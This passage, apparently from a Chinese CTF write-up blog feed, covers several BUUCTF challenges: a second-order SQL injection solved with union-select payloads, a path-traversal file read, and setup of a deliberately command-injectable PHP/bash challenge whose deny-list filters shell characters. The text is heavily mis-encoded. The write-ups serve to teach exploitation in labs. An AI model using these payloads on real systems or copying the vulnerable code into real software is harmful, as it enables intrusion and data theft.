alt="image-20240216145111102"></p><p>å³ä½¿666ç”¨æˆ·ä¸å­˜åœ¨ï¼Œä½†æ˜¯ç”±äºæ•´ä¸ªæ‹¼æ¥çš„sqlè¯­å¥å›æ˜¾äº†è®°å½•ï¼Œæ‰€ä»¥åœ¨ç½‘é¡µçš„å†…éƒ¨åˆ¤æ–­ä¸­è®¤ä¸ºè¯¥ç”¨æˆ·æ˜¯å­˜åœ¨çš„ï¼Œæ‰€ä»¥å°±å¯ä»¥æˆåŠŸç™»å½•äº†ï¼Œåˆå› ä¸ºå›æ˜¾çš„è®°å½•å€¼åªæœ‰database()çš„ä¿¡æ¯ï¼Œæ‰€ä»¥ç™»å½•åç½‘é¡µå›æ˜¾çš„å†…å®¹ä¸ºæ•°æ®åº“ä¿¡æ¯ï¼ŒåŒæ—¶ä¹ŸéªŒè¯äº†åœ¨ç™»å½•ç•Œé¢æ²¡æœ‰å¯¹ç”¨æˆ·è¾“å…¥çš„å†…å®¹è¿›è¡Œâ€™\â€˜è½¬ä¹‰çš„å¤„ç†ã€‚</p><h3 id="å‡å¦‚666ç”¨æˆ·å­˜åœ¨"><a href="#å‡å¦‚666ç”¨æˆ·å­˜åœ¨" class="headerlink" title="å‡å¦‚666ç”¨æˆ·å­˜åœ¨:"></a>å‡å¦‚666ç”¨æˆ·å­˜åœ¨:</h3><h4 id="æˆ‘ä»¬å…ˆæ³¨å†Œä¸€ä¸ª666ç”¨æˆ·"><a href="#æˆ‘ä»¬å…ˆæ³¨å†Œä¸€ä¸ª666ç”¨æˆ·" class="headerlink" title="æˆ‘ä»¬å…ˆæ³¨å†Œä¸€ä¸ª666ç”¨æˆ·:"></a>æˆ‘ä»¬å…ˆæ³¨å†Œä¸€ä¸ª666ç”¨æˆ·:</h4><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs txt">username=666<br>password=123<br></code></pre></td></tr></table></figure><p><img src="/images/2024-2-18/image-20240216145604894.png" alt="image-20240216145604894"></p><h4 id="ç™»å½•-1"><a href="#ç™»å½•-1" class="headerlink" title="ç™»å½•:"></a>ç™»å½•:</h4><p><img src="/images/2024-2-18/image-20240216145635144.png" alt="image-20240216145635144"></p><h5 id="indexç•Œé¢"><a href="#indexç•Œé¢" class="headerlink" title="indexç•Œé¢:"></a>indexç•Œé¢:</h5><p><img src="/images/2024-2-18/image-20240216145656828.png" alt="image-20240216145656828"></p><p>æ˜¾ç¤ºçš„å†…å®¹ä¸ºï¼Œæ­£å¸¸ç”¨æˆ·ç™»å½•åçš„ç»“æœï¼Œå³é»˜è®¤æ˜¾ç¤ºçš„å†…å®¹ï¼Œé»˜è®¤å¯ä»¥æ˜¯å‰ç«¯èµ‹å€¼ï¼Œæˆ–è€…æ•°æ®åº“é»˜è®¤å­˜å‚¨å†å–å‡ºã€‚</p><h4 id="æˆ‘ä»¬å†ç”¨æˆ‘ä»¬çš„payloadç™»å½•"><a href="#æˆ‘ä»¬å†ç”¨æˆ‘ä»¬çš„payloadç™»å½•" class="headerlink" title="æˆ‘ä»¬å†ç”¨æˆ‘ä»¬çš„payloadç™»å½•:"></a>æˆ‘ä»¬å†ç”¨æˆ‘ä»¬çš„payloadç™»å½•:</h4><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs txt">username=666&#x27;union select database()#<br>password=123<br></code></pre></td></tr></table></figure><p><img src="/images/2024-2-18/image-20240216145914809.png" alt="image-20240216145914809"></p><h5 id="indexç•Œé¢-1"><a href="#indexç•Œé¢-1" class="headerlink" title="indexç•Œé¢:"></a>indexç•Œé¢:</h5><p><img src="/images/2024-2-18/image-20240216145952795.png" alt="image-20240216145952795"></p><p>å‘ç°æ˜¯ç™»å½•666ç”¨æˆ·æ—¶çš„æ­£å¸¸indexé¡µé¢å›æ˜¾ç»“æœã€‚</p><h4 id="ä½¿ç”¨æœ¬åœ°æµ‹è¯•"><a href="#ä½¿ç”¨æœ¬åœ°æµ‹è¯•" class="headerlink" title="ä½¿ç”¨æœ¬åœ°æµ‹è¯•:"></a>ä½¿ç”¨æœ¬åœ°æµ‹è¯•:</h4><p><img src="/images/2024-2-18/image-20240216150050452.png" alt="image-20240216150050452"></p><h5 id="sql1-1"><a href="#sql1-1" class="headerlink" title="sql1:"></a>sql1:</h5><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs txt">select info from test2 where username=&#x27;666&#x27;<br></code></pre></td></tr></table></figure><p><img src="/images/2024-2-18/image-20240216150145367.png" alt="image-20240216150145367"></p><p>æ­£å¸¸çš„ç™»å½•æƒ…å†µçš„è¿”å›ç»“æœï¼Œè™½ç„¶infoæ²¡æœ‰å€¼ï¼Œä½†æ˜¯666å­˜åœ¨æ‰€ä»¥ä¾ç„¶å¯ä»¥è¿”å›ç»“æœé›†ï¼Œå‰ç«¯å¯ä»¥åˆ¤æ–­ç»“æœé›†infoçš„å€¼æ¥ç¡®å®šæ˜¯ä¸æ˜¯nullä»è€Œèµ‹å€¼é»˜è®¤å€¼ã€‚</p><h5 id="sql2-1"><a href="#sql2-1" class="headerlink" title="sql2:"></a>sql2:</h5><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs txt">select info from test2 where username=&#x27;666&#x27;union select DATABASE()#&#x27; and password =123<br></code></pre></td></tr></table></figure><p><img src="/images/2024-2-18/image-20240216150355179.png" alt="image-20240216150355179"></p><p>è¿™æ˜¯æˆ‘ä»¬è¿›è¡Œæ¶æ„ç™»å½•çš„æƒ…å†µï¼Œè¿™æ¬¡æ˜¯ç”±äº666ç”¨æˆ·å­˜åœ¨ï¼Œæ‰€ä»¥ç¬¬ä¸€æ¡è®°å½•ä¸ºnullï¼Œä¸åƒä¹‹å‰666ä¸å­˜åœ¨æ—¶ï¼Œç›´æ¥ç¬¬ä¸€æ¡è®°å½•å°±æ˜¯database(),å‰ç«¯ä¾ç„¶å¯ä»¥é€šè¿‡åªåˆ¤æ–­ç¬¬ä¸€æ¡è®°å½•æ˜¯ä¸æ˜¯ä¸ºnullæ¥å†³å®šæ˜¯å¦èµ‹å€¼é»˜è®¤å†…å®¹ã€‚</p><p>è¿™ä¹Ÿå°±æ˜¯ä¸ºä»€ä¹ˆæˆ‘ä»¬æ³¨å†Œ666ç”¨æˆ·åï¼Œå†ç”¨æ¶æ„payloadç™»å½•æ—¶ï¼Œå›æ˜¾çš„å´æ˜¯æ­£å¸¸çš„ç”¨æˆ·ç™»å½•ç»“æœã€‚</p><p><strong>æ˜ç¡®äº†ç½‘é¡µçš„æ¼æ´åï¼Œæˆ‘ä»¬å°±å¯ä»¥è¿›è¡Œæ”»å‡»äº†ï¼Œæœ¬è´¨å°±æ˜¯å¸¸è§„çš„unionæ³¨å…¥é…åˆäºŒæ¬¡æ³¨å…¥</strong></p><h3 id="è·å–æ•°æ®åº“è¡¨çš„ä¿¡æ¯"><a href="#è·å–æ•°æ®åº“è¡¨çš„ä¿¡æ¯" class="headerlink" title="è·å–æ•°æ®åº“è¡¨çš„ä¿¡æ¯:"></a>è·å–æ•°æ®åº“è¡¨çš„ä¿¡æ¯:</h3><h4 id="payload-2"><a href="#payload-2" class="headerlink" title="payload:"></a>payload:</h4><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs txt">username=xxx&#x27; union select group_concat(table_name) from information_schema.tables where table_schema=&#x27;ctftraining&#x27; #<br>password=123<br><br>è¿™é‡Œçš„xxxä¸€å®šè¦æ˜¯ä¸å­˜åœ¨çš„ç”¨æˆ·<br></code></pre></td></tr></table></figure><h4 id="æ³¨å†Œ-1"><a href="#æ³¨å†Œ-1" class="headerlink" title="æ³¨å†Œ:"></a>æ³¨å†Œ:</h4><p><img src="/images/2024-2-18/image-20240216151020825.png" alt="image-20240216151020825"></p><h4 id="ç™»å½•-2"><a href="#ç™»å½•-2" class="headerlink" title="ç™»å½•:"></a>ç™»å½•:</h4><p><img src="/images/2024-2-18/image-20240216151214545.png" alt="image-20240216151214545"></p><h4 id="indexç•Œé¢-2"><a href="#indexç•Œé¢-2" class="headerlink" title="indexç•Œé¢:"></a>indexç•Œé¢:</h4><p><img src="/images/2024-2-18/image-20240216151228908.png" alt="image-20240216151228908"></p><p>å‘ç°flagè¡¨</p><h3 id="çˆ†è¡¨çš„å­—æ®µå"><a href="#çˆ†è¡¨çš„å­—æ®µå" class="headerlink" title="çˆ†è¡¨çš„å­—æ®µå:"></a>çˆ†è¡¨çš„å­—æ®µå:</h3><h4 id="payload-3"><a href="#payload-3" class="headerlink" title="payload:"></a>payload:</h4><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs txt">username=xxx&#x27; union select group_concat(column_name) from information_schema.columns where table_name=&#x27;flag&#x27;#<br>password=123<br></code></pre></td></tr></table></figure><p><img src="/images/2024-2-18/image-20240216151405598.png" alt="image-20240216151405598"></p><p>å¾—åˆ°å­—æ®µåä¸ºflag</p><h3 id="çˆ†å­—æ®µä¿¡æ¯"><a href="#çˆ†å­—æ®µä¿¡æ¯" class="headerlink" title="çˆ†å­—æ®µä¿¡æ¯:"></a>çˆ†å­—æ®µä¿¡æ¯:</h3><h4 id="payload-4"><a href="#payload-4" class="headerlink" title="payload:"></a>payload:</h4><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs txt">username=xxx&#x27; union select group_concat(flag) from flag#<br>password=123<br></code></pre></td></tr></table></figure><p><img src="/images/2024-2-18/image-20240216151539104.png" alt="image-20240216151539104"></p><p>flag&#x3D;flag{47be8e14-bae6-4158-9c41-f92df44c27b2}</p>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>BUUCTF_[ç½‘é¼æ¯ 2020 åŠå†³èµ›]AliceWebsite</title>
    <link href="/2024/02/18/2024-02-18-%5B%E7%BD%91%E9%BC%8E%E6%9D%AF%202020%20%E5%8D%8A%E5%86%B3%E8%B5%9B%5DAliceWebsite/"/>
    <url>/2024/02/18/2024-02-18-%5B%E7%BD%91%E9%BC%8E%E6%9D%AF%202020%20%E5%8D%8A%E5%86%B3%E8%B5%9B%5DAliceWebsite/</url>
    
    <content type="html"><![CDATA[<h1 id="ç½‘é¼æ¯-2020-åŠå†³èµ›-AliceWebsite"><a href="#ç½‘é¼æ¯-2020-åŠå†³èµ›-AliceWebsite" class="headerlink" title="[ç½‘é¼æ¯ 2020 åŠå†³èµ›]AliceWebsite"></a>[ç½‘é¼æ¯ 2020 åŠå†³èµ›]AliceWebsite</h1><h2 id="åœºæ™¯"><a href="#åœºæ™¯" class="headerlink" title="åœºæ™¯:"></a>åœºæ™¯:</h2><h3 id="Homeç•Œé¢"><a href="#Homeç•Œé¢" class="headerlink" title="Homeç•Œé¢:"></a>Homeç•Œé¢:</h3><p><img src="/images/2024-2-18/image-20240216155840649.png" alt="image-20240216155840649"></p><p>å…ˆèµ°ä¸€éç½‘é¡µçš„ä¸šåŠ¡é€»è¾‘ï¼Œå¯¹èœå•æ çš„å†…å®¹éƒ½è®¿é—®ä¸€ä¸‹:</p><h3 id="Aboutç•Œé¢"><a href="#Aboutç•Œé¢" class="headerlink" title="Aboutç•Œé¢:"></a>Aboutç•Œé¢:</h3><p><img src="/images/2024-2-18/image-20240216160155361.png" alt="image-20240216160155361"></p><h3 id="è®¿é—®robots-txt"><a href="#è®¿é—®robots-txt" class="headerlink" title="è®¿é—®robots.txt:"></a>è®¿é—®robots.txt:</h3><p><img src="/images/2024-2-18/image-20240216160245044.png" alt="image-20240216160245044"></p><p>æ²¡æœ‰å¤ªå¤šæœ‰ç”¨ä¿¡æ¯</p><h2 id="æŸ¥çœ‹ç½‘é¡µæºä»£ç "><a href="#æŸ¥çœ‹ç½‘é¡µæºä»£ç " class="headerlink" title="æŸ¥çœ‹ç½‘é¡µæºä»£ç :"></a>æŸ¥çœ‹ç½‘é¡µæºä»£ç :</h2><p><img src="/images/2024-2-18/image-20240216160321154.png" alt="image-20240216160321154"></p><p>å‘ç°æœ‰ä¸€ä¸ªå‚æ•°action,åé¢çš„å€¼éƒ½æ˜¯æ–‡ä»¶åï¼ŒçŒœæµ‹è¯¥å‚æ•°å¯ä»¥è¿›è¡Œä»»æ„æ–‡ä»¶è¯»å–</p><h2 id="ä½¿ç”¨actionå‚æ•°è¯»å–flagæ–‡ä»¶"><a href="#ä½¿ç”¨actionå‚æ•°è¯»å–flagæ–‡ä»¶" class="headerlink" title="ä½¿ç”¨actionå‚æ•°è¯»å–flagæ–‡ä»¶:"></a>ä½¿ç”¨actionå‚æ•°è¯»å–flagæ–‡ä»¶:</h2><h3 id="payload"><a href="#payload" class="headerlink" title="payload:"></a>payload:</h3><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs txt">index.php?action=../../../../../../../../flag<br></code></pre></td></tr></table></figure><p><img src="/images/2024-2-18/image-20240216160512278.png" alt="image-20240216160512278"></p><p>flag&#x3D;flag{6749e126-c3e8-4d36-89ca-3e4a0c801992}    </p><h2 id="æ¼æ´æˆå› "><a href="#æ¼æ´æˆå› " class="headerlink" title="æ¼æ´æˆå› :"></a>æ¼æ´æˆå› :</h2><p><img src="/images/2024-2-18/image-20240216160823788.png" alt="image-20240216160823788"></p><h3 id="åˆ†æ"><a href="#åˆ†æ" class="headerlink" title="åˆ†æ:"></a>åˆ†æ:</h3><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs txt">index.phpä¸­çš„includeä¼šå°†å­˜åœ¨çš„æ–‡ä»¶æ‹¼æ¥åˆ°ä»£ç ä¸Šï¼Œè€Œæ— æ³•ç¼–è¯‘çš„æ–‡ä»¶å†…å®¹å°±ä¼šç›´æ¥æ˜¾ç¤ºå‡ºæ¥ï¼Œä»è€Œé€ æˆä»»æ„æ–‡ä»¶è¯»å–ã€‚<br></code></pre></td></tr></table></figure>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>BUUCTF_ç¬¬äºŒå±ŠN1CTF Junior_zakoå¤ç°</title>
    <link href="/2024/02/18/2024-02-18-%E7%AC%AC%E4%BA%8C%E5%B1%8AN1CTF%20Junior_zako%E5%A4%8D%E7%8E%B0/"/>
    <url>/2024/02/18/2024-02-18-%E7%AC%AC%E4%BA%8C%E5%B1%8AN1CTF%20Junior_zako%E5%A4%8D%E7%8E%B0/</url>
    
    <content type="html"><![CDATA[<h1 id="ç¬¬äºŒå±ŠN1CTF-Junior-zakoå¤ç°"><a href="#ç¬¬äºŒå±ŠN1CTF-Junior-zakoå¤ç°" class="headerlink" title="ç¬¬äºŒå±ŠN1CTF Junior_zakoå¤ç°"></a>ç¬¬äºŒå±ŠN1CTF Junior_zakoå¤ç°</h1><h2 id="å‚è€ƒ"><a href="#å‚è€ƒ" class="headerlink" title="å‚è€ƒ:"></a>å‚è€ƒ:</h2><h3 id="wpå‚è€ƒ"><a href="#wpå‚è€ƒ" class="headerlink" title="wpå‚è€ƒ:"></a>wpå‚è€ƒ:</h3><h4 id="é¢˜ç›®wp"><a href="#é¢˜ç›®wp" class="headerlink" title="é¢˜ç›®wp:"></a>é¢˜ç›®wp:</h4><p><a href="https://blog.csdn.net/Zhiyilang/article/details/136054665">N1CTF Junior 2024 Web Official Writeupï¼ˆNu1L Teamç»„ç»‡çš„å®˜æ–¹çº³æ–°èµ›äº‹ï¼Œæ—¨åœ¨é€‰æ‹”ä¼˜ç§€äººæ‰åŠ å…¥Nu1L Teamï¼Œå¯æ˜¯å°åŒ—æ˜¯å¤§äºŒç”Ÿï¼ŒæŠ±ç€ç©ç©çš„å¿ƒæ€æ¥çš„ï¼‰_n1ctf junion-CSDNåšå®¢</a></p><p><a href="https://c1oudfl0w0.github.io/blog/2024/02/03/%E7%AC%AC%E4%BA%8C%E5%B1%8A-N1CTF-Junior/#zako">ç¬¬äºŒå±Š N1CTF Junior | é›²æµã®Lowest World (c1oudfl0w0.github.io)</a></p><h4 id="phpéæ³•ä¼ å‚"><a href="#phpéæ³•ä¼ å‚" class="headerlink" title="phpéæ³•ä¼ å‚:"></a>phpéæ³•ä¼ å‚:</h4><p><a href="https://blog.csdn.net/mochu7777777/article/details/115050295">è°ˆä¸€è°ˆPHPä¸­å…³äºéæ³•å‚æ•°åä¼ å‚é—®é¢˜_arr4yéæ³•ä¼ å‚-CSDNåšå®¢</a></p><h3 id="ç¯å¢ƒå‚è€ƒ"><a href="#ç¯å¢ƒå‚è€ƒ" class="headerlink" title="ç¯å¢ƒå‚è€ƒ:"></a>ç¯å¢ƒå‚è€ƒ:</h3><p><a href="https://blog.csdn.net/a_piece_of_ppx/article/details/124929728">ã€Linuxä¸­shellå‘½ä»¤ã€‘.shæ–‡ä»¶ç§ç§æ“ä½œ-CSDNåšå®¢</a></p><h2 id="ç¯å¢ƒæ­å»º"><a href="#ç¯å¢ƒæ­å»º" class="headerlink" title="ç¯å¢ƒæ­å»º:"></a>ç¯å¢ƒæ­å»º:</h2><h3 id="åˆ›å»ºindex-php"><a href="#åˆ›å»ºindex-php" class="headerlink" title="åˆ›å»ºindex.php:"></a>åˆ›å»ºindex.php:</h3><p><img src="/images/2024-2-18/image-20240211230203947.png" alt="image-20240211230203947"></p><h4 id="æºç "><a href="#æºç " class="headerlink" title="æºç :"></a>æºç :</h4><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br> <br><span class="hljs-comment">//something hide here</span><br><span class="hljs-title function_ invoke__">highlight_string</span>(<span class="hljs-title function_ invoke__">shell_exec</span>(<span class="hljs-string">&quot;cat &quot;</span>.<span class="hljs-keyword">__FILE__</span>.<span class="hljs-string">&quot; | grep -v preg_match | grep -v highlight&quot;</span>));<br> <br><span class="hljs-variable">$cmd</span> = <span class="hljs-variable">$_REQUEST</span>[<span class="hljs-string">&quot;__secret.xswl.io&quot;</span>];<br><span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">strlen</span>(<span class="hljs-variable">$cmd</span>)&gt;<span class="hljs-number">70</span>) &#123;<br>    <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;no, &gt;70&quot;</span>);<br>&#125;<br><span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&quot;/(&#x27;|`|\n|\t|\\\$|~|@|#|;|&amp;|\\||-|_|\\=|\\*|!|\\%|\\\^|index|execute&#x27;)/is&quot;</span>,<span class="hljs-variable">$cmd</span>))&#123;<br>    <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;ä½ å°±ä¸èƒ½ç»•ä¸€ä¸‹å–µ&quot;</span>);<br>&#125;<br> <br><span class="hljs-title function_ invoke__">system</span>(<span class="hljs-string">&quot;./execute.sh &#x27;&quot;</span>.<span class="hljs-variable">$cmd</span>.<span class="hljs-string">&quot;&#x27;&quot;</span>);<br> <br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><h3 id="åˆ›å»ºexecute-shï¼š"><a href="#åˆ›å»ºexecute-shï¼š" class="headerlink" title="åˆ›å»ºexecute.shï¼š"></a>åˆ›å»ºexecute.shï¼š</h3><p><img src="/images/2024-2-18/image-20240211230134948.png" alt="image-20240211230134948"></p><h4 id="æºç -1"><a href="#æºç -1" class="headerlink" title="æºç :"></a>æºç :</h4><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br></pre></td><td class="code"><pre><code class="hljs sh"><span class="hljs-meta">#!/bin/bash</span><br> <br><span class="hljs-function"><span class="hljs-title">reject</span></span>() &#123;<br>    <span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;<span class="hljs-variable">$&#123;1&#125;</span>&quot;</span><br>    <span class="hljs-built_in">exit</span> 1<br>&#125;<br> <br>XXXCMD=<span class="hljs-variable">$1</span><br> <br>awk -v str=<span class="hljs-string">&quot;<span class="hljs-variable">$&#123;XXXCMD&#125;</span>&quot;</span> <span class="hljs-string">&#x27;</span><br><span class="hljs-string">BEGIN &#123;</span><br><span class="hljs-string">    deny=&quot;`;&amp;$()&#123;&#125;[]!@#$%^&amp;*-&quot;;</span><br><span class="hljs-string">    for (i = 1; i &lt;= length(str); i++) &#123;</span><br><span class="hljs-string">        char = substr(str, i, 1);</span><br><span class="hljs-string">        for (x = 1; x &lt; length(deny) + 1; x++) &#123;</span><br><span class="hljs-string">            r = substr(deny, x, 1);</span><br><span class="hljs-string">            if (char == r) exit 1;</span><br><span class="hljs-string">        &#125;</span><br><span class="hljs-string">    &#125;</span><br><span class="hljs-string">&#125;</span><br><span class="hljs-string">&#x27;</span><br> <br>[ $? -ne 0 ] &amp;&amp; reject <span class="hljs-string">&quot;NOT ALLOW 1&quot;</span><br> <br>eval_cmd=$(<span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;<span class="hljs-variable">$&#123;XXXCMD&#125;</span>&quot;</span> | awk -F <span class="hljs-string">&quot;|&quot;</span> <span class="hljs-string">&#x27;</span><br><span class="hljs-string">BEGIN &#123;</span><br><span class="hljs-string">    allows[1] = &quot;ls&quot;;</span><br><span class="hljs-string">    allows[2] = &quot;makabaka&quot;;</span><br><span class="hljs-string">    allows[3] = &quot;whoareu&quot;;</span><br><span class="hljs-string">    allows[4] = &quot;cut~no&quot;;</span><br><span class="hljs-string">    allows[5] = &quot;grep&quot;;</span><br><span class="hljs-string">    allows[6] = &quot;wc&quot;;</span><br><span class="hljs-string">    allows[7] = &quot;æ‚é±¼æ‚é±¼&quot;;</span><br><span class="hljs-string">    allows[8] = &quot;netstat.jpg&quot;;</span><br><span class="hljs-string">    allows[9] = &quot;awsl&quot;;</span><br><span class="hljs-string">    allows[10] = &quot;dmesg&quot;;</span><br><span class="hljs-string">    allows[11] = &quot;xswl&quot;;</span><br><span class="hljs-string">&#125;&#123;</span><br><span class="hljs-string">    num = 1;</span><br><span class="hljs-string">    for (i = 1; i &lt;= NF; i++) &#123;</span><br><span class="hljs-string">        for (x = 1; x &lt;= length(allows); x++) &#123;</span><br><span class="hljs-string">            cmpstr = substr($i, 1, length(allows[x]));</span><br><span class="hljs-string">            if (cmpstr == allows[x])</span><br><span class="hljs-string">                eval_cmd[num++] = $i;</span><br><span class="hljs-string">        &#125;</span><br><span class="hljs-string">    &#125;</span><br><span class="hljs-string">&#125;</span><br><span class="hljs-string">END &#123;</span><br><span class="hljs-string">    for (i = 1; i &lt;= length(eval_cmd); i++) &#123;</span><br><span class="hljs-string">        if (i != 1)</span><br><span class="hljs-string">            printf &quot;| %s&quot;, eval_cmd[i];</span><br><span class="hljs-string">        else</span><br><span class="hljs-string">            printf &quot;%s&quot;, eval_cmd[i];</span><br><span class="hljs-string">    &#125;</span><br><span class="hljs-string">&#125;&#x27;</span><br>)<br> <br>[ <span class="hljs-string">&quot;<span class="hljs-variable">$&#123;XXXCMD&#125;</span>&quot;</span> = <span class="hljs-string">&quot;&quot;</span> ] &amp;&amp; reject <span class="hljs-string">&quot;NOT ALLOW 2&quot;</span><br> <br><span class="hljs-built_in">eval</span> <span class="hljs-variable">$&#123;eval_cmd&#125;</span><br></code></pre></td></tr></table></figure><h3 id="èµ‹äºˆæ‰€æœ‰ç”¨æˆ·å¯¹zakoæ–‡ä»¶å¤¹çš„æ‰€æœ‰æƒé™"><a href="#èµ‹äºˆæ‰€æœ‰ç”¨æˆ·å¯¹zakoæ–‡ä»¶å¤¹çš„æ‰€æœ‰æƒé™" class="headerlink" title="èµ‹äºˆæ‰€æœ‰ç”¨æˆ·å¯¹zakoæ–‡ä»¶å¤¹çš„æ‰€æœ‰æƒé™:"></a>èµ‹äºˆæ‰€æœ‰ç”¨æˆ·å¯¹zakoæ–‡ä»¶å¤¹çš„æ‰€æœ‰æƒé™:</h3><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs txt">chmod -R 777 /www/admin/TestForWeb/zako<br></code></pre></td></tr></table></figure><p><img src="/images/2024-2-18/image-20240212015024040.png" alt="image-20240212015024040"></p><h3 id="å¯¹execute-shè®¾ç½®è¿è¡Œæƒé™"><a href="#å¯¹execute-shè®¾ç½®è¿è¡Œæƒé™" class="headerlink" title="å¯¹execute.shè®¾ç½®è¿è¡Œæƒé™:"></a>å¯¹execute.shè®¾ç½®è¿è¡Œæƒé™:</h3><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs txt">chmod +x ./execute.sh #ä½¿è„šæœ¬å…·æœ‰æ‰§è¡Œæƒé™<br></code></pre></td></tr></table></figure><p><img src="/images/2024-2-18/image-20240211230549528.png" alt="image-20240211230549528"></p><p>å¯ä»¥è¿›è¡Œè¿è¡Œï¼ï¼ï¼</p><h3 id="åˆ›å»ºflagæ–‡ä»¶åœ¨ä¸Šä¸€çº§æ–‡ä»¶å¤¹ä¸­"><a href="#åˆ›å»ºflagæ–‡ä»¶åœ¨ä¸Šä¸€çº§æ–‡ä»¶å¤¹ä¸­" class="headerlink" title="åˆ›å»ºflagæ–‡ä»¶åœ¨ä¸Šä¸€çº§æ–‡ä»¶å¤¹ä¸­:"></a>åˆ›å»ºflagæ–‡ä»¶åœ¨ä¸Šä¸€çº§æ–‡ä»¶å¤¹ä¸­:</h3><h4 id="readflag"><a href="#readflag" class="headerlink" title="readflag:"></a>readflag:</h4><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs txt">south&#123;y0u_a3e_w1l1!!!&#125;<br></code></pre></td></tr></table></figure><p><img src="/images/2024-2-18/image-20240211231441817.png" alt="image-20240211231441817"></p><h3 id="è®¿é—®æˆ‘ä»¬çš„ç¯å¢ƒ"><a href="#è®¿é—®æˆ‘ä»¬çš„ç¯å¢ƒ" class="headerlink" title="è®¿é—®æˆ‘ä»¬çš„ç¯å¢ƒ:"></a>è®¿é—®æˆ‘ä»¬çš„ç¯å¢ƒ:</h3><p><img src="/images/2024-2-18/image-20240211231515563.png" alt="image-20240211231515563"></p><h3 id="æµ‹è¯•ç¯å¢ƒ"><a href="#æµ‹è¯•ç¯å¢ƒ" class="headerlink" title="æµ‹è¯•ç¯å¢ƒ:"></a>æµ‹è¯•ç¯å¢ƒ:</h3><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs txt">phpéæ³•ä¼ å‚ï¼Œå°†_å˜ä¸º[,<br>?_[secret.xswl.io=ls<br></code></pre></td></tr></table></figure><p><img src="/images/2024-2-18/image-20240211231710088.png" alt="image-20240211231710088"></p><p>æˆ‘ä»¬çš„ç¯å¢ƒæ­å»ºæˆåŠŸï¼ï¼ï¼</p><h2 id="zakoå¤ç°"><a href="#zakoå¤ç°" class="headerlink" title="zakoå¤ç°:"></a>zakoå¤ç°:</h2><h3 id="phpéæ³•ä¼ å‚ï¼š"><a href="#phpéæ³•ä¼ å‚ï¼š" class="headerlink" title="phpéæ³•ä¼ å‚ï¼š"></a>phpéæ³•ä¼ å‚ï¼š</h3><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs 